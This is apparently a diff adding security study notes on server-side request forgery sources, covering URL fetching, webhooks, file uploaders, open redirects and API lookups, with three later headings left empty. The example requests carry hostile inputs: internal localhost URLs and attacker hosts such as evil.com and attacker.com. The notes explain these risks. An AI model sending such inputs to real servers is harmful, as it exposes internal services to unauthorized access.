@@ -1,0 +1,66 @@
+SSRF Sources:
+•  1- URL Fetching / Redirection:Description: When a web application allows users to input URLs or external links, and the server fetches resources from those URLs (e.g., an image, API, or file).
+
+Example:
+A URL shortener or image downloader that retrieves a file or content from a user-provided URL.
+
+GET /download?url=https://external.com/file
+Risk: Attackers can provide internal URLs or malicious external URLs to gain access to sensitive systems.
+
+_________________________________________________________________________________________________________
+
+•  2- Webhookes: Description: Webhooks allow external services to send requests to your server. These services can be vulnerable to SSRF if not properly filtered.
+
+Example:
+A webhook that triggers an internal API request or a system call whenever an event occurs externally.
+
+{
+  "event": "user_signup",
+  "callback_url": "http://localhost:8080/internal-service"
+}
+
+Risk: Attackers can use webhooks to force the server to interact with internal services.
+
+_________________________________________________________________________________________________________
+
+•  3- File Uploader: File Uploaders (with URL Processing)
+Description: When a server allows users to upload files and then process URLs (e.g., by downloading a file from a provided URL).
+
+Example:
+A file upload tool that retrieves content from a URL specified by the user (e.g., for fetching metadata, images, or files before processing the upload).
+
+POST /upload
+Content-Type: multipart/form-data
+URL: https://evil.com/malicious.zip
+
+Risk: The server may download a malicious file from an attacker-controlled URL or access internal services via URL-based exploitation.
+_________________________________________________________________________________________________________
+•  4- Open Redirection: Description: An open redirection vulnerability allows an attacker to redirect the server to an arbitrary location.
+
+Example:
+A URL parameter that redirects the server to a different location based on user input.
+
+GET /redirect?url=https://attacker.com
+
+Risk: Attackers can redirect the server to internal IPs or sensitive endpoints (e.g., http://localhost/admin).
+
+_________________________________________________________________________________________________________
+•  5- API Services: Description: APIs that interact with third-party services may expose SSRF if the server is able to make requests to arbitrary URLs.
+
+Example:
+An API that accepts a URL and fetches information from that URL to return to the client.
+
+GET /api/lookup?url=http://example.com
+
+Risk: Attackers could provide a malicious internal URL (e.g., http://localhost:8080/internal-api) to gain unauthorized access to internal services.
+
+_________________________________________________________________________________________________________
+•  6- Cloud Metadata Service
+
+_________________________________________________________________________________________________________
+•  7- Internal Services Accessed via HTTP Requests
+
+_________________________________________________________________________________________________________
+
+•  8- DNS Resolution Services
+  
